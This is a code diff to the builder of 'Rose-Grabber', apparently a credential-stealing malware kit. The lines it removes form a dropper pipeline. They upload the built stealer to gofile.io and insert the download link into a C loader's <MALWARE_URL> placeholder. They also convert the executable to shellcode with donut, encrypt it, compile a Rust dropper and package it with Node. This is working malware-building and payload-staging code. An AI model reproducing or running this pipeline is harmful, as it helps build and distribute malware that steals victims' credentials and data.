@@ -43,7 +43,7 @@ logger = logging.getLogger(__name__)
 __title__ = 'Rose UI Builder'
 __avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/Rose.png'
 __version__ = '2.3'
-__debugm__ = False # Debug mode, dev-only
+__debugm__ = False # Debug mode
 __icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/roseb.png"
 __devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/ui/msg.txt").text.splitlines()[0].split(" - ")
 
@@ -243,11 +243,6 @@ def _makebuild(q: Queue, data_builder) -> str:
         try:
             logging.info("Entered get_files")
             shutil.copy(os.path.join(Path(__file__).resolve().parent.parent, "source", "rose.py"), path)
-            shutil.copy(os.path.join(Path(__file__).resolve().parent.parent, "source", "c-exec", "main.c"), path)
-            shutil.copytree(os.path.join(Path(__file__).resolve().parent.parent, "source", "nodejs"), os.path.join(path, "nodejs"))
-            shutil.copytree(os.path.join(Path(__file__).resolve().parent.parent, "source", "rust-drop"), os.path.join(path, "rust-drop"))
-            shutil.copy(os.path.join(Path(__file__).resolve().parent.parent, "utils", "donut", "donut.exe"), path)
-            shutil.copy(os.path.join(Path(__file__).resolve().parent.parent, "utils", "Pestilence-master", "encrypt_shellcode.py"), os.path.join(path, "rust-drop"))
             logger.info(f'Successfully copied components to {path}')
         except Exception as e:
             logger.error(f"Error in get_files: {e}")
@@ -341,53 +336,6 @@ def _makebuild(q: Queue, data_builder) -> str:
                     logger.info("Finished file pump process")
                 except Exception as e:
                     logger.error(f"Error in pumping file: {e}")
-    
-    def get_best_server():
-        server_url = "https://api.gofile.io/getServer"
-        response = requests.get(server_url)
-        server_data = response.json()
-    
-        if response.status_code != 200 or server_data['status'] != 'ok':
-            logger.error(f"Failed to get best server. Response: {server_data}")
-            return None
-    
-        return server_data['data']
-
-    def upload_to_gofile(file_path):
-        best_server = get_best_server()
-    
-        if best_server is None:
-            return None
-
-        upload_url = f"https://{best_server['server']}.gofile.io/uploadFile"
-        files = {'file': open(file_path, 'rb')}
-    
-        try:
-            logger.info(f"Uploading file to {upload_url}...")
-            response = requests.post(upload_url, files=files)
-
-            response.raise_for_status()
-        except requests.exceptions.HTTPError as errh:
-            logger.error(f"HTTP Error: {errh}")
-        except requests.exceptions.ConnectionError as errc:
-            logger.error(f"Error Connecting: {errc}")
-        except requests.exceptions.Timeout as errt:
-            logger.error(f"Timeout Error: {errt}")
-        except requests.exceptions.RequestException as err:
-            logger.error(f"Error: {err}")
-            return None
-
-        data = response.json()
-        logger.info(data)
-        if data['status'] == 'ok':
-            content_id = data['data']['fileId']
-        else:
-            logger.error(f"Failed to get content ID. Response: {data}")
-            return None
-
-        download_link = f"https://{best_server['server']}.gofile.io/download/{content_id}/{os.path.basename(file_path)}"
-
-        return download_link
     
     def compile_python():
         logger.info("Entered py compile")
@@ -485,88 +433,6 @@ def _makebuild(q: Queue, data_builder) -> str:
             logger.info(f"Output of Python compile process saved in rosecompile.log")
         except Exception as e:
             logger.error(f"Error in py compile: {e}")
-
-    c = os.path.join(path, "main.c")
-    cf = os.path.join(path, "main.exe")
-    cf2 = os.path.join(path, "main")
-    donut = os.path.join(path, "donut.exe")
-    shellc = os.path.join(path, "rust-drop", "shellcode.bin")
-    rsdir = os.path.join(path, "rust-drop")
-    encc = os.path.join(path, "encrypt_shellcode.py")
-    rsf = os.path.join(path, 'pestilence-master', 'target', 'release', 'pestilence.exe')
-    
-    def c_conf():
-        execu = os.path.join(os.getcwd(), final)
-        logger.info("Entered c_conf")
-        contents = open(c, "r").read()
-        contents = contents.replace("<MALWARE_URL>", f"{upload_to_gofile(execu)}")
-        open(c, "w").write(contents)
-    
-    def compile_c():
-        logger.info("Entered c compile")
-        compile_line = f'gcc {c} -o {cf2} -mwindows'
-        try:
-            logger.info("Entering c compile process")
-            logger.info(f'C Compile CMD Line: {compile_line}')
-            output_file = "logs\\rosecompile-c.log"
-            subprocess.call(
-                compile_line,
-                shell=True,
-                stdout=open(output_file, 'w'),
-                stderr=subprocess.STDOUT
-            )
-            logger.info(f"Output of C compile process saved in rosecompile.log")
-        except Exception as e:
-            logger.error(f"Error in c compile: {e}")
-
-    def compile_rs():
-        logger.info("Entered rust compile")
-        output_file = "logs\\rosecompile-rs.log"
-        encrypt_file = "logs\\encrypt.log"
-        shell_file = "logs\\shellcode.log"
-        shell_cmd = f"\"{donut}\" --input:{cf} --output:{shellc}"
-        logger.info(f"Shellcode CMD Line: {shell_cmd}")
-        subprocess.run(shell_cmd, shell=True, stdout=open(shell_file, 'w'), stderr=subprocess.STDOUT)
-        encrypt_line = f"call {rvenv} && cd \"{os.path.join(path, 'rust-drop')}\" && python {encc} {shellc}"
-        logger.info(f"Encrypt CMD Line: {encrypt_line}")
-        subprocess.run(encrypt_line, shell=True, stdout=open(encrypt_file, 'w'), stderr=subprocess.STDOUT)
-        rs_compile_line = f'cd "{rsdir}" && cargo build --release'
-        try:
-            logger.info("Entering rust compile process")
-            logger.info(f'Rust Compile CMD Line: {rs_compile_line}')
-            subprocess.call(
-                rs_compile_line,
-                shell=True,
-                stdout=open(output_file, 'w'),
-                stderr=subprocess.STDOUT
-            )
-            logger.info(f"Output of Rust compile process saved in rosecompile.log")
-        except Exception as e:
-            logger.error(f"Error in rust compile: {e}")
-
-    js=os.path.join(path, "nodejs")
-    
-    def compile_js():
-        logger.info("Entered js compile")
-        output_file = "logs\\rosecompile-js.log"
-        inst_file = "logs\\rosecompile-js-inst.log"
-        subprocess.call(f'npm install -g pkg && cd "{js}" && npm i', shell=True, stdout=open(inst_file, 'w'), stderr=subprocess.STDOUT)
-        #shutil.move(rsf, js)
-        #compile_line = f'node "{os.path.join(js, "index.js")}" "{rsf}" "{path}"'
-        execu = os.path.join(os.getcwd(), final)
-        compile_line = f'node "{os.path.join(js, "index.js")}" "{execu}" "{path}"'
-        try:
-            logger.info("Entering js compile process")
-            logger.info(f'JS Compile CMD Line: {compile_line}')
-            subprocess.call(
-                compile_line,
-                shell=True,
-                stdout=open(output_file, 'w'),
-                stderr=subprocess.STDOUT
-            )
-            logger.info(f"Output of JS compile process saved in rosecompile.log")
-        except Exception as e:
-            logger.error(f"Error in js compile: {e}")
 
     def cleanup():
         logger.info("Entered cleanup")
